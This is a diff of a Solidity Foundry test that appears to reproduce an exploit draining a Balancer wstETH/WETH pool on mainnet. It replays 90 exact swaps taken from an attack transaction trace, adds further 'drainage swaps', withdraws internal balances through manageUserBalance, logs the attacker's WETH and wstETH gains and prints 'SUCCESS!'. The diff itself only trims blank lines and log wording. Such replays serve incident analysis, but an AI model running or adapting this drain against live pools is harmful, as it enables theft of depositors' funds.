@@ -48,7 +48,6 @@ interface IBalancerVault {
         );
 
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
-
     function getInternalBalance(address user, IERC20[] memory tokens)
         external view
         returns (uint256[] memory balances);
@@ -69,12 +68,10 @@ interface IWETH is IERC20 {
 
 contract BalancerWstEthWethPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     bytes32 constant POOL_ID_WSTETH = 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2;
     address constant wstETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
     address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -115,7 +112,7 @@ contract BalancerWstEthWethPoolTest is Test {
             toInternalBalance: true
         });
 
-        // Exact swaps from transaction trace
+        // swaps from transaction trace
         ExactSwapData[90] memory swaps;
         swaps[0] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 1, indexOut: 2 });
         swaps[1] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 1, indexOut: 0 });
@@ -304,8 +301,6 @@ contract BalancerWstEthWethPoolTest is Test {
         console.log("Additional drainage swaps:", additionalSwaps);
 
         // WITHDRAWAL VIA manageUserBalance()
-        console.log("=== WITHDRAWAL manageUserBalance() ===");
-
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(address(WETH));
         internalTokens[1] = IERC20(wstETH_WETH_BPT);
@@ -383,7 +378,7 @@ contract BalancerWstEthWethPoolTest is Test {
             console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
             console.log("wstETH withdrawn:", internalBalances[2] / 1e18, "ETH");
 
-            console.log("Total value withdrawn (approx):", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
+            console.log("Total value:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
         } else {
             console.log("No internal balances to withdraw");
         }
@@ -410,7 +405,7 @@ contract BalancerWstEthWethPoolTest is Test {
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount + additionalSwaps);
+        console.log("Total swaps:", successCount + additionalSwaps);
         console.log("SUCCESS!");
     }
     
